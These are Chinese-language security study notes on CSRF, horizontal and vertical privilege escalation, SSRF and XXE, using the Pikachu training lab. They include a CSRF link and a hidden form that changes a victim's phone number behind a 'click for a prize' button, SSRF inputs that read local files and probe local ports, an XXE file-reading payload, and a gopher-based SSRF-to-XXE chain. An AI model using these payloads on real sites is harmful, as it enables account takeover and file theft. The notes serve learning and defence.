csrf与xss攻击的区别？
CSRF通过虚假构造请求数据包，诱导用户点击，使用用户本身权限达到修改目标内容的目的，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏--修改绑定手机，实现盗窃账号的功能
csrf的防御？
对敏感信息的操作增加安全的token，能够防御csrf；
对敏感信息的操作增加安全的验证码；
对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等

csrf

get类型，诱导用户点击
http://pikachu.com/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&phonenum=9999&add=usa&email=lili%40pikachu.com&submit=submit

post类型
http://pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php

sex=girl&phonenum=123&add=usa&email=lili%40pikachu.com&submit=submit

<form method="POST" action="http://pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php">
<input type="hidden" name="sex" value="boy"/>
<input type="hidden" name="phonenum" value="9999"/>
<input type="hidden" name="add" value="usa"/>
<input type="hidden" name="email" value="lili%40pikachu.com"/>
<input type="submit" name="submit" value="点我抽奖">
</form>

csrf漏洞主要用来欺骗用户点击，如果使用token可以防御csrf


一般是配合网页扫描，扫到关键目录，查看是否有越权漏洞

越权操作：

水平越权：
用户A----用户B
网站没有使用cookie/session鉴别是不是真的是用户传过来的

垂直越权：
用户A---管理员A
一些只能admin用户使用的程序，没有鉴权，直接可以访问，当其他人知道你这个程序位置的时候，就可以直接访问，代替admin行使权限

----------------
SSRF
curl系列的函数，让php代码可以去访问其他人，linux中请求访问url（apt功效）
curl不仅可以访问外地端口，也可以访问本地端口，使用伪协议访问本地文件
url=file:///c:/a.txt
url=127.0.0.1:3306、80、22（探测本地开放端口）

------------------

xxe
（一些非常老的网站或者不良网站）
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
<!ENTITY xxe SYSTEM "file:///c:/a.txt" >]>
<user>
<username>&xxe;</username>
<password>b</password>
</user>

------------------

ssrf+xxe

xxe漏洞出现的地方，已经触发漏洞的，整个数据包，urlencode2次，复制

打开ssrf漏洞出现的地方
url=gopher://xxe.com:80/_[一堆刚刚urlencode过的东西]

gopher
信息查找，tcp/ip，可以做tcp数据流的事情
